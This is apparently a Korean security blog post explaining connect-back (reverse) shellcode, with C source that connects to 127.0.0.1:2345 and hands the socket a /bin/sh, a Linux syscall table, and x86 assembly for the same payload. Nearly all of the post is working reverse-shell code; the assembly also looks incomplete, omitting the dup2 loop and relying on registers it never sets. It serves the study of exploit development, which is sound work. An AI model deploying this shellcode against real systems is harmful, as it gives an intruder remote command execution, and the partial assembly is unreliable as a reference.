---
title: Reverse shellcode (Connect-Back shellcode)
date: 2019-01-12 15:00:53
categories:
- Shellcode Exploit
- Reverse shellcode
tags:
- Reverse shellcode
- Connect-Back shellcode
---

공격자에게 연결 요청하는 shellcode



```c
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
 
int main(void)
{
        int i, server_sockfd;
        socklen_t socklen;
        struct sockaddr_in server_addr; // 서버 정보 구조체
 
        char *argv[] = { "/bin/sh", NULL};
        server_addr.sin_family = AF_INET; // 주소 형식
        server_addr.sin_port = htons(2345); // port
        server_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // address
        // socket fd 생성
        server_sockfd = socket( AF_INET, SOCK_STREAM, 0 );
    	// 서버에 접속
        connect(server_sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr));
 		// socket 함수에 의해 생성된 표준 스트립 fd 복제(링크)
        for(i = 0; i <= 2; i++)
                dup2(server_sockfd, i);
 		// shell 실행
        execve( "/bin/sh", argv, NULL );
}
```



| function | sysnum(eax) | subcallnum(ebx) | args(ecx)                            | edx  |
| -------- | ----------- | --------------- | ------------------------------------ | ---- |
| socket   | 102 (0x66)  | 1               | AF_INET = 2, SOCKET_STREAM = 1, 0    | NULL |
| connect  | 102 (0x66)  | 3               | sockfd, sockaddr, len(sockaddr) = 16 |      |
| dup2     | 63 (0x3f)   | sockfd          | fd=0,1,2                             |      |
| execve   | 11          | "/bin/sh"       | {"/bin/sh", NULL}                    | NULL |



```asm
mov al, 0x66
xor ebx, ebx
cdq
inc ebx
push edx
push ebx
push 0x2
mov ecx, esp
int 0x80

mov al, 0x66
push ebp
push di
inc ebx
push bx
mov ecx, esp
push 0x10
push ecx
push edx
mov ecx, esp
inc ebx
int 0x80

push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov eax, edx
mov al, 0xb
int 0x80
```



#### reference

​	https://www.lazenca.net/display/TEC/04.Reverse+Shellcode

​	https://systemoverlord.com/2018/10/30/understanding-shellcode-the-reverse-shell.html

​	http://d4m0n.tistory.com/93





